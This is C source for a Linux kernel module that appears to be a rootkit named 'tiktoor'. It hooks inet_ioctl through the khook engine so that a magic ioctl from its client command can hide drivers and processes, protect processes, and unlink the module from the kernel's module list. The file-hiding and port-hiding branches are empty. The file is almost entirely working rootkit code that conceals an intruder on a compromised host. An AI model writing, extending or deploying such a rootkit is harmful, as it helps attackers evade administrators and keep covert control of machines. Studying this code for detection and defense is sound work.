#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kernel.h>

#include "khook/engine.c"

#include "protocol.h"

#include "driver_hiding/driver_hiding.h"
#include "file_hiding/file_hiding.h"
#include "port_hiding/port_hiding.h"
#include "process_hiding/process_hiding.h"
#include "process_protection/process_protection.h"

MODULE_AUTHOR("RuanJianAnQuanYuanLiDiQiZu");

// ---------------------- Module hide and unhide -- Begin ----------------------
// see https://xcellerator.github.io/posts/linux_rootkits_05/

static struct list_head *prev_module;

void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide_module(void) {
    if (prev_module) {
        list_add(&THIS_MODULE->list, prev_module);
    }
}
// ---------------------- Module hide and unhide -- End ----------------------

static int __init on_module_init(void) {
    khook_init();
    return 0;
}

static void __exit on_module_exit(void) {
    khook_cleanup();
}

KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg) {
    int ret = 0;
    if (cmd == TIKTOOR_IOCTL_CMD) {
        // this syscall is from our tiktoor client
        struct TiktoorCmdArg cmd_arg;
        if (copy_from_user(&cmd_arg, (void *)arg, sizeof(struct TiktoorCmdArg)) != 0) {
            // copy failed
            goto origin;
        }
        switch (cmd_arg.action) {
            case 0x0:
                // driver hiding
                handle_driver_hiding_request(cmd_arg.subargs);
                break;
            case 0x1:
                // file hiding
                break;
            case 0x2:
                // port hiding
                break;
            case 0x3:
                // process hiding
                handle_process_hiding_request(cmd_arg.subargs);
                break;
            case 0x4:
                // process protection
                protect_process_hiding_request(cmd_arg.subargs) ;
                break;
            case 0x5:
                // module hiding
                hide_module();
                break;
            case 0x6:
                // module unhiding
                unhide_module();
                break;
            default:
                // not valid
                goto origin;
        }
    }

origin:
    ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
	return ret;
}

module_init(on_module_init);
module_exit(on_module_exit);

MODULE_LICENSE("GPL");
